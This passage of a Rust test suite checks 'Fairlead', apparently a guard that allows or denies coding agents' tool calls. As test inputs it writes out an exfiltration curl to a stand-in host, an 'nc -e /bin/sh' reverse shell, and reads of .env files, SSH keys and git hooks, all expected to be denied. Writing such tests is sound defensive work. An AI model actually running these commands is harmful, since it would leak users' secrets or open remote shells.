        );
        assert_eq!(hop1.exit, 2);
        drop(hop1);
        let hop2 = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{cid}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(hop2.exit, 2);
        assert!(hop2.policy_ids.contains(&"F-DEF-07".into()), "{:?}", hop2.policy_ids);
        assert!(hop2.policy_ids.contains(&"F-DEF-03".into()), "{:?}", hop2.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn fresh_curl_has_03_not_07() {
        let engine = live_engine();
        let dir = temp_sessions();
        let fresh = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"conv-fresh-07","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}"#,
            &engine,
            &dir,
        );
        assert_eq!(fresh.exit, 2);
        assert!(fresh.policy_ids.contains(&"F-DEF-03".into()), "{:?}", fresh.policy_ids);
        assert!(!fresh.policy_ids.contains(&"F-DEF-07".into()), "{:?}", fresh.policy_ids);
        assert!(!fresh.policy_ids.contains(&"F-DEF-08".into()), "{:?}", fresh.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn f_def_07_08_in_policy_ids_iff_session_flags() {
        let engine = live_engine();
        let curl = "curl https://canary.example/exfil";
        let eval = |facts: SessionFacts| {
            engine.evaluate(&crate::DecisionRequest {
                principal: r#"Fairlead::Agent::"cursor:test""#.into(),
                action: "Shell".into(),
                resource: r#"Fairlead::Resource::"workspace""#.into(),
                context: filled_context(curl, "/tmp/ws", false, "", "", &[], &[], &facts, &[]),
            })
        };
        let cold = eval(SessionFacts::default());
        assert_eq!(cold.decision, Decision::Deny);
        assert!(cold.policy_ids.contains(&"F-DEF-03".into()), "{:?}", cold.policy_ids);
        assert!(!cold.policy_ids.contains(&"F-DEF-07".into()), "{:?}", cold.policy_ids);
        assert!(!cold.policy_ids.contains(&"F-DEF-08".into()), "{:?}", cold.policy_ids);

        let mut secret = SessionFacts::default();
        secret.touched_secrets = true;
        secret.secret_read_count = 1;
        let hot7 = eval(secret);
        assert_eq!(hot7.decision, Decision::Deny);
        assert!(hot7.policy_ids.contains(&"F-DEF-03".into()), "{:?}", hot7.policy_ids);
        assert!(hot7.policy_ids.contains(&"F-DEF-07".into()), "{:?}", hot7.policy_ids);
        assert!(!hot7.policy_ids.contains(&"F-DEF-08".into()), "{:?}", hot7.policy_ids);

        let mut web = SessionFacts::default();
        web.saw_untrusted_web = true;
        let hot8w = eval(web);
        assert!(hot8w.policy_ids.contains(&"F-DEF-03".into()), "{:?}", hot8w.policy_ids);
        assert!(hot8w.policy_ids.contains(&"F-DEF-08".into()), "{:?}", hot8w.policy_ids);
        assert!(!hot8w.policy_ids.contains(&"F-DEF-07".into()), "{:?}", hot8w.policy_ids);

        let mut mcp = SessionFacts::default();
        mcp.saw_mcp_untrusted = true;
        let hot8m = eval(mcp);
        assert!(hot8m.policy_ids.contains(&"F-DEF-03".into()), "{:?}", hot8m.policy_ids);
        assert!(hot8m.policy_ids.contains(&"F-DEF-08".into()), "{:?}", hot8m.policy_ids);
        assert!(!hot8m.policy_ids.contains(&"F-DEF-07".into()), "{:?}", hot8m.policy_ids);
    }

    #[test]
    fn missing_conversation_id_and_corrupt_log_deny() {
        let engine = live_engine();
        let dir = temp_sessions();
        let miss = cursor_hook_eval_in(
            "shell",
            r#"{"command":"pytest -q","cwd":"/tmp/ws","sandbox":true}"#,
            &engine,
            &dir,
        );
        assert_eq!(miss.exit, 2);
        assert_eq!(miss.stdout["user_message"], "missing conversation_id");

        let empty = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"","command":"pytest -q","cwd":"/tmp/ws","sandbox":true}"#,
            &engine,
            &dir,
        );
        assert_eq!(empty.exit, 2);
        assert_eq!(empty.stdout["user_message"], "missing conversation_id");

        let cid = "conv-corrupt";
        let path = crate::session_path(&dir, cid);
        std::fs::create_dir_all(&dir).expect("dir");
        std::fs::write(&path, "{not json}\n").expect("write");
        let bad = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{cid}","command":"pytest -q","cwd":"/tmp/ws","sandbox":true}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(bad.exit, 2);
        assert_eq!(bad.stdout["user_message"], "fairlead deny: session store");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn suite11_doctor_shaped_f_sub_03_not_f_def_03() {
        let engine = live_engine();
        let mut facts = SessionFacts::default();
        facts.subagent_active = true;
        let granted = vec!["net.egress".to_string()];
        let parent: Vec<String> = vec![];
        let ctx = filled_context(
            "curl https://canary.example/exfil",
            "/tmp/ws",
            false,
            "",
            "",
            &granted,
            &parent,
            &facts,
            &["subagent".into()],
        );
        let out = engine.evaluate(&crate::DecisionRequest {
            principal: r#"Fairlead::Agent::"cursor:doctor""#.into(),
            action: "Shell".into(),
            resource: r#"Fairlead::Resource::"workspace""#.into(),
            context: ctx,
        });
        assert!(!out.errored);
        assert_eq!(out.decision, Decision::Deny);
        assert!(out.policy_ids.contains(&"F-SUB-03".into()), "{:?}", out.policy_ids);
        assert!(!out.policy_ids.contains(&"F-DEF-03".into()), "{:?}", out.policy_ids);

        facts.subagent_active = false;
        let cold = filled_context(
            "curl https://canary.example/exfil",
            "/tmp/ws",
            false,
            "",
            "",
            &granted,
            &parent,
            &facts,
            &["subagent".into()],
        );
        let cold_out = engine.evaluate(&crate::DecisionRequest {
            principal: r#"Fairlead::Agent::"cursor:doctor""#.into(),
            action: "Shell".into(),
            resource: r#"Fairlead::Resource::"workspace""#.into(),
            context: cold,
        });
        assert!(!cold_out.policy_ids.contains(&"F-SUB-03".into()), "{:?}", cold_out.policy_ids);
    }

    #[test]
    fn suite11_hook_child_curl_and_parent_pytest() {
        let engine = live_engine();
        let dir = temp_sessions();
        let parent = "conv-parent-11";
        let child = "conv-child-11";
        let start = cursor_subagent_start_in(
            &format!(r#"{{"conversation_id":"{parent}","tool_call_id":"tc-11"}}"#),
            &dir,
        );
        assert_eq!(start.exit, 0);
        assert!(start.parent_session_id.is_some());
        let deny = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{child}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(deny.exit, 2);
        assert!(deny.policy_ids.contains(&"F-SUB-03".into()), "{:?}", deny.policy_ids);
        assert!(deny.policy_ids.contains(&"F-DEF-03".into()), "{:?}", deny.policy_ids);
        assert!(deny.provenance.contains(&"subagent".into()), "{:?}", deny.provenance);
        assert_eq!(deny.parent_session_id, start.parent_session_id);
        assert!(deny.parent_caps.is_empty());
        let pytest = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{parent}","command":"ls","cwd":"/tmp/ws","sandbox":true}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(pytest.exit, 0, "parent ls must still allow");
        assert!(!pytest.policy_ids.contains(&"F-SUB-03".into()), "{:?}", pytest.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn suite12_stop_cannot_clear_touched_secrets() {
        let engine = live_engine();
        let dir = temp_sessions();
        let parent = "conv-parent-12";
        let child = "conv-child-12";
        let hop1 = cursor_hook_eval_in(
            "read",
            &format!(r#"{{"conversation_id":"{parent}","file_path":"/tmp/.env"}}"#),
            &engine,
            &dir,
        );
        assert_eq!(hop1.exit, 2);
        cursor_subagent_start_in(
            &format!(r#"{{"conversation_id":"{parent}","tool_call_id":"tc-12"}}"#),
            &dir,
        );
        let child_curl = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{child}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(child_curl.exit, 2);
        assert!(child_curl.policy_ids.contains(&"F-SUB-03".into()), "{:?}", child_curl.policy_ids);
        cursor_subagent_stop_in(
            &format!(r#"{{"conversation_id":"{parent}"}}"#),
            &dir,
        );
        let facts = reduce(&load_lines(&dir, parent).expect("lines"));
        assert!(facts.touched_secrets);
        assert!(!facts.subagent_active);
        let hop2 = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{parent}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert_eq!(hop2.exit, 2);
        assert!(hop2.policy_ids.contains(&"F-DEF-07".into()), "{:?}", hop2.policy_ids);
        let raw = std::fs::read_to_string(crate::session_path(&dir, parent)).expect("read");
        assert!(raw.contains("\"secret\""));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn suite12_child_secret_unions_to_parent() {
        let engine = live_engine();
        let dir = temp_sessions();
        let parent = "conv-parent-12b";
        let child = "conv-child-12b";
        cursor_subagent_start_in(
            &format!(r#"{{"conversation_id":"{parent}","tool_call_id":"tc-12b"}}"#),
            &dir,
        );
        let child_read = cursor_hook_eval_in(
            "read",
            &format!(r#"{{"conversation_id":"{child}","file_path":"/tmp/.env"}}"#),
            &engine,
            &dir,
        );
        assert_eq!(child_read.exit, 2);
        cursor_subagent_stop_in(&format!(r#"{{"conversation_id":"{parent}"}}"#), &dir);
        let facts = reduce(&load_lines(&dir, parent).expect("lines"));
        assert!(facts.touched_secrets);
        let hop = cursor_hook_eval_in(
            "shell",
            &format!(
                r#"{{"conversation_id":"{parent}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
            ),
            &engine,
            &dir,
        );
        assert!(hop.policy_ids.contains(&"F-DEF-07".into()), "{:?}", hop.policy_ids);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn pretool_task_is_idempotent_with_start() {
        let dir = temp_sessions();
        let parent = "conv-pretool";
        let start = cursor_subagent_start_in(
            &format!(r#"{{"conversation_id":"{parent}","tool_call_id":"tc-same"}}"#),
            &dir,
        );
        let pre = cursor_pretool_in(
            &format!(
                r#"{{"conversation_id":"{parent}","tool_name":"Task","tool_use_id":"tc-same"}}"#
            ),
            &dir,
            &live_engine(),
        );
        assert_eq!(start.exit, 0);
        assert_eq!(pre.exit, 0);
        assert_eq!(start.parent_session_id, pre.parent_session_id);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// `.encode` contains the bytes `nc`. That is not the program. A quoted `nc` is.
    #[test]
    fn subprocess_encode_is_not_nc() {
        let engine = live_engine();
        let dir = temp_sessions();
        let encode = cursor_pretool_in(
            r#"{"conversation_id":"conv-encode","tool_name":"Write","tool_input":{"file_path":"harness.py","contents":"import subprocess\n# function once since concurrent principal\nx.encode()\n"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(encode.exit, 0, "{:?}", encode.policy_ids);
        assert!(
            !encode.policy_ids.contains(&"F-DEF-03".into()),
            "{:?}",
            encode.policy_ids
        );
        let nc = cursor_pretool_in(
            r#"{"conversation_id":"conv-nc","tool_name":"Write","tool_input":{"file_path":"exfil.py","contents":"import subprocess\nsubprocess.run([\"nc\", \"-e\", \"/bin/sh\"])\n"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(nc.exit, 2, "{:?}", nc.policy_ids);
        assert!(nc.policy_ids.contains(&"F-DEF-03".into()), "{:?}", nc.policy_ids);
        let shell = |cid: &str, cmd: &str| {
            cursor_hook_eval_in(
                "shell",
                &json!({"conversation_id": cid, "command": cmd, "cwd": "/tmp/ws", "sandbox": false})
                    .to_string(),
                &engine,
                &dir,
            )
        };
        let child = shell(
            "conv-child",
            r#"python3 -c "import os; os.system('echo child-ran')""#,
        );
        assert_eq!(child.exit, 2, "{:?}", child.policy_ids);
        assert!(
            child.policy_ids.contains(&"F-DEF-03".into()),
            "{:?}",
            child.policy_ids
        );
        assert!(
            child.policy_ids.contains(&"F-DEF-09".into()),
            "{:?}",
            child.policy_ids
        );
        let print1 = shell("conv-print", r#"python3 -c "print(1)""#);
        assert_eq!(print1.exit, 2, "{:?}", print1.policy_ids);
        assert!(
            print1.policy_ids.contains(&"F-DEF-09".into()),
            "{:?}",
            print1.policy_ids
        );
        assert!(
            !print1.policy_ids.contains(&"F-DEF-03".into()),
            "{:?}",
            print1.policy_ids
        );
        assert_eq!(print1.stdout["user_message"], "fairlead deny: F-DEF-09");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// beforeReadFile is handed file contents, so a missing path never reaches it.
    /// preToolUse Read sees the path string. The file is not created.
    #[test]
    fn missing_ssh_key_read_is_f_def_02() {
        let engine = live_engine();
        let dir = temp_sessions();
        let raw = r#"{"conversation_id":"conv-missing-ssh","tool_name":"Read","tool_input":{"file_path":"/tmp/fairlead-no-such/.ssh/id_ed25519"}}"#;
        let pre = cursor_pretool_in(raw, &dir, &engine);
        assert_eq!(pre.exit, 2, "{:?}", pre.policy_ids);
        assert!(pre.policy_ids.contains(&"F-DEF-02".into()), "{:?}", pre.policy_ids);
        assert_eq!(pre.stdout["user_message"], "fairlead deny: F-DEF-02");
        let direct = cursor_hook_eval_in("read", raw, &engine, &dir);
        assert_eq!(direct.exit, 2, "{:?}", direct.policy_ids);
        assert!(
            direct.policy_ids.contains(&"F-DEF-02".into()),
            "{:?}",
            direct.policy_ids
        );
        assert_eq!(direct.stdout["user_message"], "fairlead deny: F-DEF-02");
        for (cid, path) in [
            ("conv-hooks", ".git/hooks/pre-commit"),
            ("conv-globpat", "**/.git/config"),
        ] {
            let raw = json!({"conversation_id": cid, "file_path": path}).to_string();
            let eval = cursor_hook_eval_in("read", &raw, &engine, &dir);
            assert_eq!(eval.exit, 2, "{path} {:?}", eval.policy_ids);
            assert!(
                eval.policy_ids.contains(&"F-DEF-02".into()),
                "{path} {:?}",
                eval.policy_ids
            );
        }
        let glob_hit = cursor_pretool_in(
            r#"{"conversation_id":"conv-glob","tool_name":"Glob","tool_input":{"glob_pattern":"**/.git/config"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(glob_hit.exit, 2, "{:?}", glob_hit.policy_ids);
        assert!(
            glob_hit.policy_ids.contains(&"F-DEF-02".into()),
            "{:?}",
            glob_hit.policy_ids
        );
        let glob_wide = cursor_pretool_in(
            r#"{"conversation_id":"conv-glob-wide","tool_name":"Glob","tool_input":{"glob_pattern":"**/*"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(glob_wide.exit, 0, "{:?}", glob_wide.policy_ids);
        assert!(
            !glob_wide.policy_ids.contains(&"F-DEF-02".into()),
            "{:?}",
            glob_wide.policy_ids
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn pretool_write_git_hooks_deny_readme_allow() {
        let engine = live_engine();
        let dir = temp_sessions();
        let deny = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":".git/hooks/pre-commit","contents":"x"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(deny.exit, 2);
        assert_eq!(deny.stdout["permission"], "deny");
        assert_eq!(deny.action, "FileWrite");
        assert_eq!(
            deny.command_preview.as_deref(),
            Some(".git/hooks/pre-commit")
        );
        let allow = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":"README.md","contents":"ok"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(allow.exit, 0);
        assert_eq!(allow.stdout["permission"], "allow");
        let mcp = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":".cursor/mcp.json","contents":"{}"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(mcp.exit, 2);
        let leak = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":"leak.py","contents":"import urllib.request\n"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(leak.exit, 2);
        assert_eq!(leak.stdout["permission"], "deny", "Write leak.py urllib");
        let hello = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":"hello.py","contents":"print(1)\n"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(hello.exit, 0);
        assert_eq!(hello.stdout["permission"], "allow", "Write hello.py");
        let del = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Delete","tool_input":{"file_path":".git/hooks/pre-commit"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(del.exit, 2);
        assert_eq!(del.stdout["permission"], "deny");
        assert_eq!(del.action, "FileWrite");
        let del_ok = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Delete","tool_input":{"file_path":"README.md"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(del_ok.exit, 0);
        assert_eq!(del_ok.stdout["permission"], "allow");
        let hello_empty = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":"hello.py","content":""}}"#,
            &dir,
            &engine,
        );
        assert_eq!(
            hello_empty.stdout["permission"],
            "allow",
            "Write hello.py empty content"
        );
        let readme_urllib = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":"README.md","contents":"see urllib docs"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(
            readme_urllib.stdout["permission"],
            "allow",
            "README urllib"
        );
        let readme_loop = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":"README.md","contents":"bind 127.0.0.1"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(
            readme_loop.stdout["permission"],
            "allow",
            "README 127.0.0.1 loopback trap"
        );
        let leak_singular = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":{"file_path":"leak.py","content":"import urllib.request\n"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(
            leak_singular.stdout["permission"],
            "deny",
            "Write leak.py content singular"
        );
        let leak_str = cursor_pretool_in(
            r#"{"conversation_id":"conv-write","tool_name":"Write","tool_input":"{\"file_path\":\"leak.py\",\"contents\":\"import urllib.request\\n\"}"}"#,
            &dir,
            &engine,
        );
        assert_eq!(
            leak_str.stdout["permission"],
            "deny",
            "Write leak.py stringified tool_input"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn pretool_grep_is_file_read() {
        let engine = live_engine();
        let dir = temp_sessions();
        let secret = cursor_pretool_in(
            r#"{"conversation_id":"conv-grep","tool_name":"Grep","tool_input":{"path":".env","pattern":"KEY"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(secret.exit, 2);
        assert_eq!(secret.action, "FileRead");
        assert!(secret.policy_ids.iter().any(|id| id == "F-DEF-02"), "{:?}", secret.policy_ids);
        let readme = cursor_pretool_in(
            r#"{"conversation_id":"conv-grep","tool_name":"Grep","tool_input":{"path":"README.md","pattern":"probe"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(readme.exit, 0);
        assert_eq!(readme.action, "FileRead");
        assert!(readme.policy_ids.iter().any(|id| id == "F-AUTO-read"), "{:?}", readme.policy_ids);
        let globbed = cursor_pretool_in(
            r#"{"conversation_id":"conv-grep","tool_name":"Grep","tool_input":{"path":"/tmp/ws","glob":"**/.env","pattern":"KEY"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(globbed.exit, 2, "glob .env");
        assert_eq!(globbed.command_preview.as_deref(), Some("**/.env"));
        let listed = cursor_pretool_in(
            r#"{"conversation_id":"conv-grep","tool_name":"Grep","tool_input":{"path":["README.md","id_rsa"],"pattern":"KEY"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(listed.exit, 2, "path list id_rsa");
        let named = cursor_pretool_in(
            r#"{"conversation_id":"conv-grep","tool_name":"Grep","tool_input":{"path":["README.md",".git/config"],"pattern":"core"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(named.exit, 2, "{:?}", named.policy_ids);
        assert!(
            named.policy_ids.contains(&"F-DEF-02".into()),
            "{:?}",
            named.policy_ids
        );
        let files = cursor_pretool_in(
            r#"{"conversation_id":"conv-grep","tool_name":"Grep","tool_input":{"path":"README.md","pattern":"fairlead","files":[".git/config"]}}"#,
            &dir,
            &engine,
        );
        assert_eq!(files.exit, 2, "{:?}", files.policy_ids);
        assert!(
            files.policy_ids.contains(&"F-DEF-02".into()),
            "{:?}",
            files.policy_ids
        );
        let wide = cursor_pretool_in(
            r#"{"conversation_id":"conv-grep","tool_name":"Grep","tool_input":{"pattern":"fairlead"}}"#,
            &dir,
            &engine,
        );
        assert_eq!(wide.exit, 0, "{:?}", wide.policy_ids);
        assert!(
            !wide.policy_ids.contains(&"F-DEF-02".into()),
            "{:?}",
            wide.policy_ids
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn windsurf_pytest_allow_git_hooks_deny() {
        let engine = live_engine();
        let dir = temp_sessions();
        let allow = windsurf_hook_eval_in(
            r#"{"agent_action_name":"pre_run_command","trajectory_id":"ws-1","tool_info":{"command_line":"ls"}}"#,
            &engine,
            &dir,
        );
        assert_eq!(allow.exit, 0);
        assert_eq!(allow.stdout["permission"], "allow");
        let deny = windsurf_hook_eval_in(
            r#"{"agent_action_name":"pre_write_code","trajectory_id":"ws-1","tool_info":{"file_path":".git/hooks/pre-commit","edits":[{"new_string":"x"}]}}"#,
            &engine,
            &dir,
        );
        assert_eq!(deny.exit, 2);
        assert_eq!(deny.stdout["permission"], "deny");
        assert_eq!(deny.action, "FileWrite");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn openhands_pytest_allow_git_hooks_deny_no_decision_allow() {
        let engine = live_engine();
        let dir = temp_sessions();
        let allow = openhands_hook_eval_in(
            r#"{"event_type":"PreToolUse","tool_name":"terminal","session_id":"oh-1","tool_input":{"command":"ls"}}"#,
            &engine,
            &dir,
        );
        assert_eq!(allow.exit, 0);
        assert!(allow.stdout.get("decision").is_none(), "{}", allow.stdout);
        let deny = openhands_hook_eval_in(
            r#"{"event_type":"PreToolUse","tool_name":"file_editor","session_id":"oh-1","tool_input":{"path":".git/hooks/pre-commit","file_text":"x"}}"#,
            &engine,
            &dir,
        );
        assert_eq!(deny.exit, 2);
        assert_eq!(deny.stdout["decision"], "deny");
        assert_ne!(deny.stdout["decision"], "allow");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn start_missing_conversation_id_denies() {
        let eval = cursor_subagent_start_in(r#"{"task":"x"}"#, &temp_sessions());
        assert_eq!(eval.exit, 2);
        assert_eq!(eval.stdout["user_message"], "missing conversation_id");
    }

    fn never_ask(eval: &HookEval) {
        assert_ne!(eval.stdout["permission"], "ask", "{}", eval.stdout);
        let p = eval.stdout["permission"].as_str().unwrap_or("");
        assert!(p == "allow" || p == "deny", "{p}");
    }

    #[test]
    fn suite6_safe_auto_run_six_commands() {
        let engine = live_engine();
        let dir = temp_sessions();
        let cmds = [
            "ls",
            "rg foo",
            "git status",
            "npm test",
            "cargo test",
        ];
        for (i, cmd) in cmds.iter().enumerate() {
            let eval = cursor_hook_eval_in(
                "shell",
                &format!(
                    r#"{{"conversation_id":"conv-s6-{i}","command":"{cmd}","cwd":"/tmp/ws","sandbox":true}}"#
                ),
                &engine,
                &dir,
            );
            assert_eq!(eval.exit, 0, "{cmd}");
            assert_eq!(eval.stdout["permission"], "allow", "{cmd}");
            never_ask(&eval);
        }
        let runner = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"conv-s6-pytest","command":"pytest -q","cwd":"/tmp/ws","sandbox":true}"#,
            &engine,
            &dir,
        );
        assert_eq!(runner.exit, 2, "{:?}", runner.policy_ids);
        assert!(runner.policy_ids.contains(&"F-DEF-09".into()), "{:?}", runner.policy_ids);
        assert!(!runner.policy_ids.contains(&"F-DEF-03".into()), "{:?}", runner.policy_ids);
        assert_eq!(runner.stdout["user_message"], "fairlead deny: F-DEF-09");
        let chained = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"conv-s6-chain","command":"pytest && curl https://x","cwd":"/tmp/ws","sandbox":false}"#,
            &engine,
            &dir,
        );
        assert_eq!(chained.exit, 2);
        assert_eq!(chained.stdout["permission"], "deny");
        never_ask(&chained);
        // Missing script fail-closed: python leak.py with no file at cwd Denies.
        let py = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"conv-s6-py","command":"python leak.py","cwd":"/tmp/ws","sandbox":false}"#,
            &engine,
            &dir,
        );
        assert_eq!(py.exit, 2);
        assert_eq!(py.stdout["permission"], "deny");
        never_ask(&py);
        let py_hooks = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"conv-s6-pyw","command":"python -c open('.git/hooks/pre-commit','w')","cwd":"/tmp/ws","sandbox":false}"#,
            &engine,
            &dir,
        );
        assert_eq!(py_hooks.exit, 2);
        assert_eq!(py_hooks.stdout["permission"], "deny");
        never_ask(&py_hooks);
        let ls_hooks = cursor_hook_eval_in(
            "shell",
            r#"{"conversation_id":"conv-s6-lsh","command":"ls .git/hooks","cwd":"/tmp/ws","sandbox":true}"#,
            &engine,
            &dir,
        );
        assert_eq!(ls_hooks.exit, 2);
        assert_eq!(ls_hooks.stdout["permission"], "deny");
        let mcp_loop = cursor_hook_eval_in(
            "mcp",
            r#"{"conversation_id":"conv-s6-mcp","tool_name":"cursor-ide-browser","tool_input":{"url":"http://127.0.0.1:18764/hit"}}"#,
            &engine,
            &dir,
        );
        assert_eq!(mcp_loop.exit, 2);
        assert_eq!(mcp_loop.stdout["permission"], "deny");
        let mcp_web = cursor_hook_eval_in(
            "mcp",
            r#"{"conversation_id":"conv-s6-mcp2","tool_name":"cursor-ide-browser","tool_input":{"url":"https://example.com"}}"#,
            &engine,
            &dir,
        );
        assert_eq!(mcp_web.exit, 2);
        assert_eq!(mcp_web.stdout["permission"], "deny");
        assert!(
            !mcp_web.policy_ids.contains(&"F-AUTO-mcp-read".into()),
            "{:?}",
            mcp_web.policy_ids
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// F-AUTO-mcp-read is the named pipe, not the complement of the write-verb list.
    #[test]
    fn mcp_named_read_allowlist() {
        let engine = live_engine();
        let dir = temp_sessions();
        let mcp = |cid: &str, tool: &str| {
            cursor_hook_eval_in(
                "mcp",
                &json!({"conversation_id": cid, "tool_name": tool}).to_string(),
                &engine,
                &dir,
            )
        };
        let drop_table = mcp("conv-drop", "drop_table");
        assert_eq!(drop_table.exit, 2, "{:?}", drop_table.policy_ids);
        assert_eq!(drop_table.stdout["permission"], "deny");
        assert_eq!(drop_table.tool_name, "drop_table");
        assert!(
            !drop_table.policy_ids.contains(&"F-AUTO-mcp-read".into()),
            "{:?}",
            drop_table.policy_ids
        );
        let get_issue = mcp("conv-get", "get_issue");
        assert_eq!(get_issue.exit, 2, "{:?}", get_issue.policy_ids);
        assert!(!get_issue.policy_ids.contains(&"F-AUTO-mcp-read".into()));
        let named = mcp("conv-named", "get_latest_issue");
        assert_eq!(named.exit, 0, "{:?}", named.policy_ids);
        assert!(named.policy_ids.contains(&"F-AUTO-mcp-read".into()), "{:?}", named.policy_ids);
        let write = mcp("conv-write", "create_issue");
        assert_eq!(write.exit, 2, "{:?}", write.policy_ids);
        assert!(write.policy_ids.contains(&"F-DEF-04".into()), "{:?}", write.policy_ids);
        let claude = claude_hook_eval_in(
            "pretool",
            &json!({
                "session_id": "conv-claude-mcp",
                "tool_name": "mcp__poisoned-issues__get_latest_issue",
                "tool_input": {}
            })
            .to_string(),
            &engine,
            &dir,
        );
        assert_eq!(claude.exit, 0, "{}", claude.stdout);
        assert_eq!(claude.tool_name, "mcp__poisoned-issues__get_latest_issue");
        assert!(
            claude.policy_ids.contains(&"F-AUTO-mcp-read".into()),
            "{:?}",
            claude.policy_ids
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn shell_at(engine: &Engine, sessions: &Path, cid: &str, cmd: &str, cwd: &str) -> HookEval {
        let raw = format!(
            r#"{{"conversation_id":"{cid}","command":{cmd},"cwd":{cwd},"sandbox":false}}"#,
            cmd = serde_json::to_string(cmd).expect("cmd"),
            cwd = serde_json::to_string(cwd).expect("cwd"),
        );
        cursor_hook_eval_in("shell", &raw, engine, sessions)
    }

    #[test]
    fn argv_paths_script_symlink_no_verify() {
        let engine = live_engine();
        let sessions = temp_sessions();
        let ws = temp_sessions();

        let git_env = shell_at(&engine, &sessions, "a-git-env", "git show .env", ws.to_str().unwrap());
        assert_eq!(git_env.stdout["permission"], "deny", "git show .env");
        never_ask(&git_env);

        let ls_env = shell_at(&engine, &sessions, "a-ls-env", "ls .env", ws.to_str().unwrap());
        assert_eq!(ls_env.stdout["permission"], "deny", "ls .env");

        let ls_quoted = shell_at(&engine, &sessions, "a-ls-q", r#"ls ".env""#, ws.to_str().unwrap());
        assert_eq!(ls_quoted.stdout["permission"], "deny", "ls quoted .env");

        let git_c = shell_at(
            &engine,
            &sessions,
            "a-git-c",
            "git -C . show .env",
            ws.to_str().unwrap(),
        );
        assert_eq!(git_c.stdout["permission"], "deny", "git -C . show .env");

        let git_ok = shell_at(&engine, &sessions, "a-git-ok", "git status", ws.to_str().unwrap());
        assert_eq!(git_ok.stdout["permission"], "allow", "git status");

        let ls_ok = shell_at(&engine, &sessions, "a-ls-ok", "ls", ws.to_str().unwrap());
        assert_eq!(ls_ok.stdout["permission"], "allow", "ls");

        std::fs::write(ws.join("leak.py"), "import urllib.request\n").expect("leak");
        std::fs::write(ws.join("hello.py"), "print(1)\n").expect("hello");
        std::fs::write(ws.join("exfil.js"), "fetch('http://127.0.0.1/hit')\n").expect("js");
        std::fs::write(ws.join("hello.js"), "console.log(1)\n").expect("hellojs");
        let leak = shell_at(&engine, &sessions, "a-leak", "python leak.py", ws.to_str().unwrap());
        assert_eq!(leak.stdout["permission"], "deny", "python leak.py urllib");
